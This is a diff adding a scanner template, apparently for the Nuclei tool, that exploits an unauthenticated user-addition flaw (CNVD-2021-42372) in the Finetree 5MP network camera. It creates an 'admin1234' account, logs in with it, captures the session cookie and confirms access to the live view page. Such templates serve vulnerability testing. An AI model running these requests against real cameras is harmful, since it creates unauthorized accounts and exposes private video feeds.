@@ -1,0 +1,67 @@
+id: finetree-quicksetup-user-add
+info:
+  name: Finetree 5MP Network Camera User Addition Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control,CNVD-2021-42372
+  description: |
+    This template exploits a vulnerability in the Finetree 5MP Network Camera allowing arbitrary user addition.
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: add-user
+    method: POST
+    path:
+      - /quicksetup/user_update.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "200"
+        part: body
+      - type: word
+        words:
+          - "804"
+        part: body
+
+  - id: login
+    method: POST
+    path:
+      - /
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      user=admin1234&pwd=admin1234&method=login
+    extractors:
+      - type: regex
+        name: PHPSESSID
+        regex:
+          - 'PHPSESSID=(.*?);'
+        group: 1
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: verify-login
+    method: GET
+    path:
+      - /live/view.php
+    headers:
+      Cookie: PHPSESSID={{PHPSESSID}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Camera"
+        part: title
+      - type: status
+        status:
+          - 200
